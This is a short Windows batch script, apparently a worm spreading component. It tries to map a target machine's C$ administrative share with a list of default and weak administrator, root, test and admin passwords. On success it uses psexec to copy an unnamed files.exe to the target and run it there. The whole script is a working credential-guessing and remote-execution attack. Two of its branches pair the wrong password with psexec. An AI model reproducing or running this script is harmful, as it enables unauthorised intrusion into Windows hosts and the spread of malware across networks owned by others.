:begin
net use /del \\%1\c$
net use \\%1\c$ "" /user:administrator
if not errorlevel 1 goto blkad
net use \\%1\c$ "administrator" /user:administrator
if not errorlevel 1 goto adad
net use \\%1\c$ "test" /user:administrator
if not errorlevel 1 goto adtest
net use \\%1\c$ "test" /user:test
if not errorlevel 1 goto testt
net use \\%1\c$ "test123" /user:administrator
if not errorlevel 1 goto adtestt
net use \\%1\c$ "temp" /user:administrator
if not errorlevel 1 goto adtemp
net use \\%1\c$ "temp123" /user:administrator
if not errorlevel 1 goto adtempp
net use \\%1\c$ "pass" /user:administrator
if not errorlevel 1 goto adpass
net use \\%1\c$ "password" /user:administrator
if not errorlevel 1 goto adpassw
net use \\%1\c$ "admin" /user:administrator
if not errorlevel 1 goto adadmin
net use \\%1\c$ "root" /user:root
if not errorlevel 1 goto rootroot
net use \\%1\c$ "changeme" /user:administrator
if not errorlevel 1 goto adminch
net use \\%1\c$ "admin" /user:admin
if not errorlevel 1 goto adminad
goto end
:blkad
psexec \\%1 -u administrator -p "" -f -c -d files.exe
goto end
:adad
psexec \\%1 -u administrator -p "admin" -f -c -d files.exe
goto end
:adadmin
psexec \\%1 -u administrator -p "administrator" -f -c -d files.exe
goto end
:rootroot
psexec \\%1 -u root -p "root" -f -c -d files.exe
goto end
:adminad
psexec \\%1 -u admin -p "admin" -f -c -d files.exe
goto end
:adtest
psexec \\%1 -u administrator -p "test" -f -c -d files.exe
goto end
:testt
psexec \\%1 -u test -p "test" -f -c -d files.exe
goto end
:adtestt
psexec \\%1 -u administrator -p "test123" -f -c -d files.exe
goto end
:adtemp
psexec \\%1 -u administrator -p "temp" -f -c -d files.exe
goto end
:adtempp
psexec \\%1 -u administrator -p "temp123" -f -c -d files.exe
goto end
:adpass
psexec \\%1 -u administrator -p "pass" -f -c -d files.exe
goto end
:adpassw
psexec \\%1 -u administrator -p "password" -f -c -d files.exe
goto end
:adminch
psexec \\%1 -u administrator -p "changeme" -f -c -d files.exe
goto end
:end
net use /DEL \\%1\c$
goto ended
:ended
